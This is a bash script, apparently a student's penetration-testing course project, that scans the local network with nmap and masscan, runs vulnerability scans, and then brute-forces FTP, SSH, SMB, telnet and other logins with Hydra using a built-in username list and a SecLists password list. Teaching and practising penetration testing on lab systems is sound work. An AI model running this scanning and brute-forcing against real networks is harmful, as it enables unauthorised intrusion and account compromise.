#!/usr/bin/bash

# Student name: Alex Kong
# Student code: s3
# Unit / Class code: cfc130623
# Trainer name: Kar Wei

# Project: Vulner (Penetration Testing)

##################################################################################################################
##################################################################################################################

function basic_info() 
{
	# create a banner title for the script using figlet command
	# -c centers the output horizontally.
	# -t -t sets the outpthe terminal width.
	# echo -e flag enable interpretation of backslash escapes "\e ................ \e"
	# [36m - specifies the ANSI colour text to cyan and [0m resets color to default terminal colour (white)
	# $() is used to accept figlet commands
	echo -e "\e[33m$(figlet -tc Vulnerabilities Scanner)\e[0m"
	echo " "
	echo -e "\e[36m[+] Scanning the LAN network for possible devices.\e[0m"

	# set a time of scan for vulnerabilies
	time_stamp=$(date -u)

	# create vulner.log file to track the progress
	touch vulner.log
	# insert a title header in the vulnerabilities log file
	echo "==================================== Vulnerabilities Scan Report ====================================" >> vulner.log
	echo " " >> vulner.log
	
	# Assume local LAN network is on specific submask of 255.255.255.0 on NAT connection
	# set a host machine ip variable
	# ifconfig command to find the host and grep 'broadcast' as unqiue marker and awk the 2nd column of the info.
	hostip=$(ifconfig | grep 'broadcast' | awk '{print $2}')
	echo -e "\e[32m[+] $time_stamp - Host machine is found at $hostip.\e[0m" 

	# get the first octets of the LAN network ip and store in a file
	# uniq if there is a wired LAN and wireless LAN network together so use only one
	first3octets=$(ifconfig | grep 'broadcast' | awk '{print $2}' | cut -d "." -f 1,2,3 | uniq)
	echo -e "\e[36m[+] Checking the first 3 octets in LAN network.\e[0m"
	echo -e "\e[36m[+] First 3 octets is found as $first3octets.\e[0m"

	# identfy the LAN network range	since submask is 255.255.255.0 with CIDR of 24
	# use netmask command to determine the LAN network range in CIDR /24 and its (number of IP addresses in this range).
	network_range=$(netmask -r $hostip/24)
	echo -e "\e[32m[+] $time_stamp - The current LAN network range is $network_range.\e[0m"

	# create a ip.log file to store ip addresses or possible devices as variables found on LAN network
	echo -e "\e[34m[+] A vulnerabilities's log is created.\e[0m" 

	# create ip.log file to store found live hosts
	touch ip.log

	
}


##################################################################################################################

################################################# Host Discovery #################################################

function host_discover()
{
	# nmap ping for the possible live hosts relating to the available devices on the LAN network
	# stored the found device ip results into $ip.log file
	# sort the found ip addreses in output, arrange in ascending order by last octet ansd stored in a sorted_ip.log file.
	nmap -sn $hostip/24  >> ip.log
	cat ip.log | grep -w "scan" | awk '{print $NF}' | sort > sorted_ip.log

	# Not needed for further host discovery
	rm ip.log


	# declare the IP variables not needed for further scanning
	# IP addresses with last octets to ignore due to VMware setting on a NAT network such as 1 for host machine, 2 for NAT device, 254 for DHCP server, 255 for broadcasting
	# the fixed state is the first 3 octets and only changing state is the last octet.
	# append and create a new filtered_ip.log to store the findings to next stage 
	host_machine=$first3octets.1
	nat_device=$first3octets.2
	dhcp_server=$first3octets.254
	broadcasting=$first3octets.255
	echo " "

	# Loop over a list of found live hosts based on last octet(from 3 - 253) and exclude the host machine, NAT device, DHCP server and broadcasting ones
	# for loop to check if each device ip is not the same as host machine ip address which is not topic of interest.
	# output the found live hosts into a vulner.log
	for device in $(cat sorted_ip.log)
	do 
		if [[ $device != $host_machine && $device != $nat_device && $device != $dhcp_server && $device != $broadcasting && $device != $hostip ]]
		then 
			echo -e "\e[32m[+] $time_stamp - $device is found in the current LAN network.\e[0m" >> vulner.log & 
		fi
	done

	# Not needed for further host discovery
	rm sorted_ip.log

	# output of vulner.log content for display live hosts
	cat vulner.log | grep "LAN"
	echo " "
}



##################################################################################################################

################################################# TCP & UDP Ports Scan ###########################################

function tcp_ports_scan() 
{
	echo -e "\e[36m[+] Conducting Nmap scans for TCP open ports on these live hosts: \e[0m"

	# Grab the found device ip addresses and do the nmap scan on each host's open ports in TCP and UDP ports and device information from MAC addresses
	# grep "LAN" as unique marker and awk column (NF-7) backwards
	cat vulner.log | grep "LAN" | awk '{print $(NF-7)}' | uniq > live_hosts.txt 

	# check output
	cat live_hosts.txt 
	echo " "

	# Check for open TCP ports in live hosts.
	echo -e "\e[36m[+] Enumerate each live host for open TCP ports and device OS.\e[0m"
	echo " "
	echo -e "\e[36m[+] Filtering the found open TCP ports for each host. \e[0m"

	# nmap needs root privileges as 'sudo' to run the live hosts scan. need to add 'sudo ./scanner.sh' to execute the script.
	# for loop each host for open TCP & UDP ports in SYN scan.
	for ip in $(cat live_hosts.txt)
	do 
		# -sS as Syn scan will provide the open and filtered ports and not showing the closed ports. It is quicker to find all available open TCP ports.
		# -O enable OS detections on live hosts
		# save the nmap as individual files by host  
		nmap -sS -O -p- -oN tcp_scan_$ip.txt $ip 
		echo " "
		echo -e "\e[36m[+] Wait for a min on findings. \e[0m"
		echo " "
	done

	echo -e "\e[36m[+] Checking possible open ports...... \e[0m"
	echo " "
	
	# for loop to check for MAC address and avilable open TCP ports in each host
	for ip in $(cat live_hosts.txt)
	do
		# filter a variable for MAC address and device type on each host
		mac_host=$(cat tcp_scan_$ip.txt | grep -i "MAC Address" | awk '{print $3 $4}')
	
		# filter for open tcp ports as one line string
		open_ports=$(awk -F/ '/^[0-9]/{printf $1" "}' tcp_scan_$ip.txt)
	
		# check the number of open ports
		num_ports=($(awk -F/ '/^[0-9]/{print $1}' tcp_scan_$ip.txt | wc -l)) 
	
		# check if there is any open ports on each host 
		if [ ! -z "$open_ports" ] 
		then 
			# if yes, echo the number of ports and port numbers of TCP
			# display it in terminal and record it into vulner.log
			# display MAC address and device type on terminal and record it into vulner.log
			echo -e "\e[32m[+] $time_stamp - $ip has $num_ports open tcp ports.\e[0m" | tee -a vulner.log
			echo -e "\e[32m[+] $time_stamp - open tcp ports on $ip: $open_ports.\e[0m" | tee -a vulner.log
			echo -e "\e[32m[+] $time_stamp - MAC address and device of $ip: $mac_host.\e[0m" | tee -a vulner.log
			echo " "
		else 
			# if no, output for no open ports and display MAC address information.
			# also record it into vulner.log
			echo -e "\e[31m[!] $time_stamp - $ip has no open tcp ports. May need to check firewall settings of target machine.\e[0m" | tee -a vulner.log
			echo -e "\e[31m[!] $time_stamp - MAC address and device of $ip: $mac_host.\e[0m" | tee -a vulner.log
			echo " "
		fi
	done
}



function masscan_udp()
{
	# Masscan for possible udp ports on host
	echo -e "\e[36m[+] Enumerate each live host for open UDP ports.\e[0m"
	echo " "
	
	# for loop each host for udp ports scan
	for ip in $(cat live_hosts.txt)
	do
		# masscan with root privileges and adjust the speed of scan and output to a $ip.ob
		# -pU for UDP ports and indicate the all 65535 ports
		# -- rate=<number> for scan speed
		# -oB to save a binary file
		sudo masscan --rate=30000 -pU:1-65535 $ip -oB $ip.ob 
		echo " "
		echo -e "\e[36m[+] Checking possible UDP ports on $ip \e[0m"
		echo " "
		# need to convert binary to human readable file and record it to a vulner.log
		# while loop is true and able to read the .ob file
		# then echo the contents if there is a readable output.
		# append the found results into vulner.log
		sudo masscan --readscan $ip.ob | while read line; do echo -e "\e[32m[+] $time_stamp - $line \e[0m"; done | tee -a vulner.log
		echo " "
	done
}




##################################################################################################################

################################################# Services Scan ##################################################

function port_services_scan()
{
	echo -e "\e[36m[+] Enumerate each live host services and versions on those found open ports. \e[0m"
	echo " "
	# Check for services on the found open ports
	# for loop each host for port services
	for host in $(cat live_hosts.txt)
	do
		# -p- for all 65535 ports
		# -T4 for scan speed 
		# -sV for service version detection running on those open ports."
		# -sC for running default NSE scripts on those open ports for further enumeration
		# -oN output to a file to further extract the service information
		echo -e "\e[36m[+] Checking services on $host: \e[0m"
		nmap -p- -sV -sC -T4 -oN services_$host.txt $host 
		echo " "
		echo -e "\e[36m[+] Wait time 4-5 mins for each host services scan. \e[0m"
		echo " "
		# output in terminal on findings status and record it to a vulner.log
		echo -e "\e[32m[+] $time_stamp - the service information on open ports are found in services_$host.txt file of the current directory for further enumeration. \e[0m" | tee -a vulner.log
		echo " "
	done	
}



#########################################################################################################################

################################################# Vulnerabilities Scan ##################################################

function vulnerabilities_scan() 
{
	echo -e "\e[36m[+] Starting vulnerabilites scan on live hosts. \e[0m"
	echo " "

	# for loop each host for its port list and check if there is any vulnerabilities
	for host in $(cat live_hosts.txt)
	do
		echo -e "\e[36m[+] Scanning vulnerabilities on $host: \e[0m"
		# -p- for al 65535 ports
		# -T4 for scan speed in output
		# -sV for service version detection on the open ports.
		# --script vuln to scan for vulnerable port service in each host and CVE for later exploits of pent-testing
		# -oN saves the vulnerabilities results in a file by each host
		nmap -p- -sV --script vuln -T4 -oN vul_$host.txt $host 
		echo " "
		echo -e "\e[36m[+] Wait time 9-10mins for each host. \e[0m"
		echo " "
		echo -e "\e[32m[+] $time_stamp - vulnerabilities scan results is saved in vul_$host.txt of the current directory for reference. \e[0m" | tee -a vulner.log 
		echo " "
	done

	# time delay to allow scan number of vulnerabilites on affected live hosts.
	sleep 1m
	echo " "
	echo -e "\e[32m[+] $time_stamp - vulnerabilities scan on live hosts are finished. \e[0m"
	echo " "
	echo -e "\e[36m[+] Checking number of vulnerabilities in live hosts. \e[0m"
	# time delay to allow scan number of vulnerabilites on affected live hosts.
	sleep 1m

	# for loop to check number of vulnerabilities found in each live hosts.
	for host in $(cat live_hosts.txt)
	do
		# check for number of vulnerabilities found in live host and stored a variable. 	
		vuln_num=$(grep "VULNERABLE:" vul_$host.txt | wc -l)
		echo " "
		# time delay to allow scan number of vulnerabilites on affected live hosts.
		sleep 30s
		echo -e "\e[32m[+] $time_stamp - There are $vuln_num vulnerabilities found on $host. \e[0m" | tee -a vulner.log
		echo " "
	done
}



# files removal as not needed for pent-testing
function remove_non_essentials()
{
	echo -e "\e[36m[+] Removing unnecessary files and clean up the pent-testing data collection. \e[0m"
	# for loop the found live hosts and remove unnecessary files.
	for ip in $(cat live_hosts.txt)
	do 
		# remove the tcp port results in syn scan open ports
		rm tcp_scan_$ip.txt
		# remove the masscan results in open udp since it is in binary.
		rm $ip.ob
		echo " "
	done
	echo -e "\e[36m[+] Completed in removal process. \e[0m"
	echo " "
}





###################################################################################################################################

################################################# User Enunmerations ##############################################################


# Bruteforce preparation

function manual_input()
{
	# Manual check the target host that has the highest number of vulnerabilities counts and open port services for further pent-testing.
	echo -e "\e[36m[+] Starting to find weak credentials on selected host. \e[0m"
	echo " "
	# manual input the target host IP address
	echo -e "\e[36m[+] Please enter the target host: \e[0m"
	# read it and store a target variable for bruteforcing.
	read target
	
	# testing
	echo " "
	echo -e "\e[32m[+] $time_stamp - Anaylsing host: $target for brute-forcing with Hydra. \e[0m"
	
	echo " "
	echo -e "\e[32m[+] $time_stamp - Checking weak credentials on $target \e[0m" | tee -a vulner.log
	echo " "
}



#################################################################################################################################

################################################# Specify a user list ###########################################################


# weak usernames list creation

function user_list()
{
	# assume you do not know the bruteforce list 
	echo -e "\e[36m[+] Starting user enumenration for common usernames. \e[0m"
	echo " "
	
	# create a user list
	touch users.lst
	# variable to store valid usernames
	valid_users="users.lst"

	# Manual create a user array from enum4linux -U <host> results
	# usernames can change in list if enumenration shows more information about new users
	# treat each user as a string
	usernames=("games" "nobody" "bind" "proxy" "syslog" "user" "www-data" "root" "news" "postgres" "bin" "mail" "distccd" "proftpd" "dhcp" "daemon" "sshd" "man" "lp" "mysql" "gnats" "libuuid" "backup" "msfadmin" "telnetd" "sys" "klog" "postfix" "service" "list" "irc" "ftp" "tomcat55" "sync" "uucp" )
		
	# Loop through the users in the array / list
	for user in "${usernames[@]}"
	do
		# check each username and save it in a list for later use
		echo "$user" >> "$valid_users"
	done
	
	echo -e "\e[32m[+] $time_stamp - a user list is created for $target. \e[0m" | tee -a vulner.log
	echo " "
	echo -e "\e[32m[+] $time_stamp - The users file is labelled as users.lst. \e[0m" | tee -a vulner.log
	echo " "
}
 



##########################################################################################################################################################

#################################### Specify a passwords list & create a concise password list ###########################################################

# port services to bruteforce the target from enumration stage
# ftp - 21, 2121 | ssh - 22 | telnet -23 | smtp -25 | http - 80 | smb - 139, 445 | rlogin - 513   

function create_password_list() 
{
	# To determine the right passwords, first stage is checking if the username is the same password. 
	# This also shows weak password vulnerability.
	# if yes input into a new valid password list file.
	# hydra command to test on ftp service port 21 as it is stable.

	# Method 1 - Assumption of weak passwords is usernames and passwords are the same. 
	echo -e "\e[32m[+] $time_stamp - checking if usernames and passwords are the same when host service login. \e[0m" | tee -a vulner.log
	echo " "
	# use Hydra to validate the usernames and passwords for similarities 
	# -L for using a user list
	# -P for using a password/user list
	# -vV verbose mode
	# $target - input host IP address
	# -o to save the successful login usernames and passwords in a file
	# ftp - default port is 21.
	hydra -L users.lst -P users.lst $target ftp  -vV -o output_ftp.txt

	# check if the output_ftp.txt file contains user credentials of "login" or "password"
	if grep -q -E "login:|password:" output_ftp.txt
	then
		# echo found user information and put it in vulner.log
		echo -e "\e[32m[+] $time_stamp - Found some usernames and passwords are the same for service login. \e[0m" | tee -a vulner.log
	else
		# echo if there is none.
		echo -e "\e[31m[!] $time_stamp - No usernames and passwords are found in bruteforcing FTP service login. \e[0m" | tee -a vulner.log
	fi
	
	
	# Method 2 - Use common used password list/ dictionaries / libraries to check if weak passwords exist.
	echo " "
	echo -e "\e[32m[+] $time_stamp - Starting second validation of other potential weak passwords with Seclists' password list on host. \e[0m" | tee -a vulner.log
	echo " "
	
	# declare a snapshot variable of output_ftp.txt before Method 2 to check for new entries to the file in If else statement.
	# check characters increase in the file content with "wc -c" command
	snapshot1=$(cat output_ftp.txt | wc -c)
	echo " "

	# use the seclists in file path /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt
	# set it as a variable if there is any changes in password lists or further user enumenration of credentials
	file_path="/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt"

	# use Hydra command
	# -L for using a user list
	# -P for using a password list from Seclists
	# -vV verbose mode
	# $target - input host IP address
	# -o to save the successful login usernames and passwords in a file
	# ftp - default port is 21.
	hydra -L users.lst -P $file_path $target ftp -vV -o output_ftp.txt
	
	# snapshot file after Method 2 process
	snapshot2=$(cat output_ftp.txt | wc -c)
	echo " "

	# IF else statement to check if output_ftp.txt has new entries in the file
	# current snapshot2 of output_ftp.txt is greater than snapshot1 
	if [ $snapshot2 -gt $snapshot1 ]
	then
		# echo a message 
		echo -e "\e[32m[+] $time_stamp - new entries are added to output_ftp.txt results.\e[0m" | tee -a vulner.log
		echo " "
	else
		echo -e "\e[31m[!] $ time_stamp - No new entries are made to output_ftp.txt file.\e[0m" | tee -a vulner.log
	fi
	
	
	# Next stage is to make a concise short user list and password list for easy services login checks.
	echo -e "\e[32m[+] $time_stamp - Filtering a concise password list and user list.\e[0m" | tee -a vulner.log
	echo " " 

	# define the output_ftp.txt as a variable
	output="output_ftp.txt" 

	# filter the file content for only login: usernames to a new list file
	# -o for matching the parts of the output file instead of the whole line
	# -E for grep for regular expressions
	# "login: [^ ]+" to grep users after "login:" text and a spacing
	cat $output | grep -oE "login: [^ ]+" | awk '{print $2}' | sort | uniq > filtered_users.lst

	# filter the file content for only password: passwords to a new list file
	# -o for matching the parts of the output file instead of the whole line
	# -E for grep for regular expressions
	# "login: [^ ]+" to grep passwords after "password:" text and a spacing similar to logins.
	cat $output | grep -oE "password: [^ ]+" | awk '{print $2}' | sort | uniq > filtered_pwd.lst

	# declare new filtered lists as variables
	filter_usr="filtered_users.lst"
	filter_pwd="filtered_pwd.lst"
	
	
	# check the filtered lists exist for users and passwords
	if [ -e "$filter_usr" ] && [ -e "$filter_pwd" ] 
	then
		echo -e "\e[32m[+] $time_stamp - a new user list is created as filtered_users.lst in the current directory. \e[0m" >> vulner.log
		echo -e "\e[36m[+] The new created users list are: \e[0m "
		cat filtered_users.lst
		echo " "
		
		echo -e "\e[32m[+] $time_stamp - a new password list is created as filtered_pwd.lst in the current directory. \e[0m" >> vulner.log
		echo -e "\e[36m[+] The new created passwords list are: \e[0m"
		cat filtered_pwd.lst
		echo " "
	else 
		echo -e "\e[31[!] None of them exist in current directory. \e[0m"
	fi

		
	echo -e "\e[36m[+] Compliation of a new password list and user list are done. \e[0m"
	echo " "
	
}





##########################################################################################################################################################

#################################### Weak Credentials and Service logins #################################################################################

function find_service_login()
{
	# After finding weak credentials on usernames and passwords, proceed to check if which login service is available and output in files.
	echo -e "\e[32m[+] $time_stamp - Checking for possible services logins with found usernames and passwords.\e[0m" | tee -a vulner.log 
	echo " "

	# set a variable for common services' list / array found on the host
	# other default ports are ssh - 22, telnet - 23, smtp - 25, http/http-get - 80, smb - 445, rlogin - 513.
	# treat each service as a string.
	services=("ssh" "smtp" "smb" "rlogin" "http-get" "telnet")

	# for loop in hydra on the default services 
	for service in "${services[@]}"
	do
		# define a changing state variable for each service
		output_service="output_${service}.txt"
	
		# hydra with concise filtered user list and passwords and save the output
		hydra -L filtered_users.lst -P filtered_pwd.lst $target $service -vV -o $output_service
	done
}




function filter_service_login()
{
	# output the finding of successful service logins in hydra
	echo -e "\e[36m[+] Filtering for successful services logins............... \e[0m"
		
	# count is empty /0 at the start for number of found service logins
	count=0

	# define the files to check in current directory
	outputs=("output_ftp.txt" "output_ssh.txt" "output_smtp.txt" "output_smb.txt" "output_rlogin.txt" "output_http-get.txt" "output_telnet.txt")

	# for loop to a list of files in current directory and check its contents for user credentials
	for output in "${outputs[@]}"
	do
		# check if file exists in current directory.
		if [ -f $output ]
		then
			# check if the file contains user credentials of "login" or "password"
			if grep -q -E "login:|password:" $output
			then
				# output the number of found service logins
				count=$((count + 1))
			else
				# if do not contains logins and passwords, remove it
				rm $output
			fi
		fi
	done	

	echo " "
	
	# call out the results
	if [ $count -gt 0 ]
	then 
		echo -e "\e[32m[+] $time_stamp - There are $count successful login services available. These files can be found in ther current directory as output_<service>.txt. \e[0m" | tee -a vulner.log
		echo " "
		
	else 
		echo -e "\e[31m[!] There is none successful services login found.\e[0m"
	fi	
	
}




function find_first_service_login()
{
	echo -e "\e[32m[+] $time_stamp - There is more than one login service and filtering it for the first service login credentials. \e[0m" | tee -a vulner.log
	echo " "
	echo -e "\e[36m[+] Checking current directory ....... \e[0m"

	# define a specific filename pattern example for service login as "output_<service>.txt"
	# sort for output files in current directory
	# ls command to list all files and sub-directories available
	sort_output_files=$(ls | grep -E "output")
	echo -e "\e[36m[+] Found the service login credentials files. \e[0m"
	echo " "
	echo "$sort_output_files"
	echo " "
	echo -e "\e[36m[+] Selecting the first service login ....... \e[0m "

	# grab the first service login information and display
	# head -n 1 command to specific the first output appear in the current directory
	first_output=$(ls | grep -E "output" | head -n 1)
	echo -e "\e[32m[+] $time_stamp - The first service login file is $first_output. \e[0m" | tee -a vulner.log
	echo " "
	# display the output
	cat $first_output
	
	echo " "
	echo -e "\e[32m[+] $time_stamp - End of the vulnerabilities scanner.\e[0m" | tee -a vulner.log
	echo " "
	echo -e "\e[36m[+] Thank you for using Alex Kong's vulnerabilities scanner and have a great day! \e[0m"  
}




#############################################################################################################################################################

#################################### Main function for Automation & Results #################################################################################



# declare a main function to run all sub functions as a whole automation bash script

function main()
{
	basic_info
	host_discover
	tcp_ports_scan
	masscan_udp
	port_services_scan
	vulnerabilities_scan
	remove_non_essentials
	manual_input
	user_list
	create_password_list
	find_service_login
	filter_service_login
	find_first_service_login

	echo " "
	echo -e "\e[33m[+] Print out the vulnerabilities log report. \e[0m"
	echo " "
	cat vulner.log
	echo " "
	echo -e "\e[33m[+] End of bash scripting automation for Project: Vulner (Penetration Testing)! \e[0m"	
}

main
